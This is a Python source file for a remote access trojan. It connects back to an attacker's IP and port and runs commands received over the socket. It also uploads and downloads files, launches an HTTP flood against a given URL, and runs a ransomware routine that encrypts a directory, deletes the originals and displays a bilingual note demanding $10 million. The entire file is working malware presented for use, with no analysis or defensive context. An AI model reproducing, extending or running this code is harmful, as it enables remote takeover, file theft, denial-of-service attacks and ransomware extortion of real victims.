import socket,argparse,subprocess,os,time,random,sys,pathlib,hashlib,base64,threading
from urllib.parse import urlparse
from cryptography.fernet import Fernet


list_box = []

def ware_text():
    return """jp

お使いのコンピュータはWare00より支配しております。権限を取り戻したいのであれば支払いを行う必要があります。料金は１０００万ドルとなります。２日以内に払わなかった場合お使いのコンピュータを破壊します。

en

Your computer is controlled by Ware00. If you want your privileges back, you must make a payment. The fee will be $10 million. If you do not pay within 2 days, your computer will be destroyed.
"""

def key_build(password):
    return base64.b64encode((hashlib.md5(password.encode()).hexdigest()).encode())

def path_get(target_path):
    global list_box
    if os.path.isdir(target_path) == True:
        for path in pathlib.Path(target_path).glob("*"):
            path_get(f"{path}")
    else:
        list_box.append(target_path)
    return list_box

def text_encrypt(key,message):
    return Fernet(key).encrypt(message)

def text_decrypt(key,message):
    return Fernet(key).decrypt(message)


def ransom_run(password,target_path,file_type=".ware00"): 
    global list_box
    for path in path_get(target_path):
        encrypt_data = text_encrypt(key_build(password),open(path,"rb").read())
        with open(f"{path}{file_type}","wb+")as encrypt_file:
            encrypt_file.write(encrypt_data)
        os.remove(path)
    list_box = []
    while True:
        try:
            if password == str(input(f"\n{ware_text()}\n[*] Password : ")):
                for path in path_get(target_path):
                    try:
                        decrypt_data = text_decrypt(key_build(password),open(path,"rb").read())
                        with open(path.split(file_type)[0],"w+")as decrypt_file:
                            decrypt_file.write(decrypt_data.decode())
                    except UnicodeDecodeError:
                        with open(path.split(file_type)[0],"wb+")as decrypt_file_bytes:
                            decrypt_file_bytes.write(decrypt_data)
                    os.remove(path)
                list_box = []
                sys.stdout.write(f"\n[*] UnLook {target_path} \n")
                break
            else:
                sys.stdout.write("\n[-] No_Match_Password\n")
        except KeyboardInterrupt:
            pass
        
def http_request(host,ua):
    return f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\n"

def port_scan(target_ip,start_port,end_port,port_list=[]):
    try:
        for port in range(start_port,end_port+1):
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
                if sock.connect_ex((target_ip,port)) == 0:
                    port_list.append(port)
        return port_list
    except socket.error:
        pass

def user_agent(ua_file="ua.txt"):
    #return [ua for ua in open(ua_file,"r",encoding="utf-8").readlines()]
    return ["Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko, Safari) Shiira/1.1",
            "Nokia5530XpressMusic/GoBrowser/1.6.0.48",
            "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.0a8",
            "Opera/9.27 (X11; Linux i686; U; en)",
            "Mozilla/5.0 (Windows 98; U) Opera 5.12  [de]"]

def dos_attack(target_url):
        host = urlparse(target_url).netloc
    #try:
        ip = socket.gethostbyname(host)
        #for port in port_scan(ip,1,80):
            #if port == 80:
                #open_port += 80
            #else:
                #break
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
            sock.connect((ip,80))
            while True:
                try:
                    sock.sendall(bytes(http_request(host,random.choice(user_agent())),"utf-8"))
                    for _ in range(10):
                       sock.sendall(bytes(http_request(host,random.choice(user_agent())),"utf-8"))
                except socket.error:
                    pass
    #except ConnectionResetError:
        #los_point += 1 


def victim_shell(ip,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    sock.sendall(bytes("connection!!\n","utf-8"))
    while True:
        try:
            data = sock.recv(1024*1000000)
            command_data = data.decode()
            if command_data.split()[0] == "exit":
                sys.exit()
            elif command_data.split()[0] == "cd":
                try:
                    os.chdir(command_data.split()[1])
                    sock.sendall(bytes(f"chdir-{command_data.split()[1]}\n","utf-8"))
                except IndexError:
                    os.chdir("/")
                    sock.sendall(bytes(f"chdir-/\n","utf-8"))


            elif command_data.split()[0] == "upload":
                try:
                    sock.sendall(bytes("loading...\n","utf-8"))
                    data = sock.recv(1024*1000000)
                    with open(command_data.split()[1],"w+")as up_file:
                        up_file.write(data.decode())
                    sock.sendall(bytes("Upload_OK!!\n","utf-8"))
                except UnicodeDecodeError:  
                    with open(command_data.split()[1],"wb+")as up_file:
                        up_file.write(data)
                    sock.sendall(bytes("Upload_OK!!\n","utf-8"))
                except IndexError:
                    sock.sendall(bytes("Not_File...\n","utf-8"))
            elif command_data.split()[0] == "download":
                try:
                    sock.sendall(open(command_data.split()[1],"rb").read())
                except IndexError:
                    sock.sendall(bytes("Not_Input_File...\n","utf-8"))
            elif command_data.split()[0] == "dos":
                try:
                    #threading.Thread(target=dos_attack,args=(command_data.split()[1],)).start()
                    th = threading.Thread(target=dos_attack,args=(command_data.split()[1],))
                    th.daemon = True
                    th.start()
                    sock.sendall(bytes(f"Dos_Attack!! / {command_data.split()[1]}\n","utf-8"))
                except IndexError:
                    sock.sendall(bytes("Not_Input_Target_URL\n","utf-8"))
            elif command_data.split()[0] == "ransom":
                try:
                    threading.Thread(target=ransom_run,args=(command_data.split()[1],command_data.split()[2],)).start()
                    sock.sendall(bytes("Run_Ransom!!\n","utf-8"))
                except IndexError:
                    sock.sendall(bytes("Not_Input_Ransom_Option\n","utf-8"))
                except PermissionError:
                    sock.sendall(bytes("PermissionError\n","utf-8"))
            else:
                stdout = subprocess.check_output(command_data.split())
                sock.sendall(stdout)
        except FileNotFoundError:
            sock.sendall(bytes("Not_Found_Command...\n","utf-8"))
        except PermissionError:
            sock.sendall(bytes("PermissionError\n","utf-8"))
        except subprocess.CalledProcessError:
            sock.sendall(bytes("CalledProcessError\n","utf-8"))
        


def main():
    try:
       arg = argparse.ArgumentParser()
       arg.add_argument("-ip",type=str,default="127.0.0.1",help="[*] Attacker_IP / -ip < attacker_ip >")
       arg.add_argument("-port",type=int,default=1234,help="[*] Port_Number / -port < port_number >")
       parse = arg.parse_args()
       ip,port = parse.ip,parse.port

       while True:
          try:
             victim_shell(ip,port)
          except ConnectionRefusedError:
             time.sleep(1)
          except ConnectionResetError:
             time.sleep(1)
          except IndexError:
             time.sleep(1)
          except KeyboardInterrupt:
             sys.stdout.write("[+] Stop_Connect...\n")
             sys.exit()
    except TypeError:
        subprocess.check_call(["python3",sys.argv[0],"-h"])
        sys.exit()

if __name__ == "__main__":
    sys.exit(main())
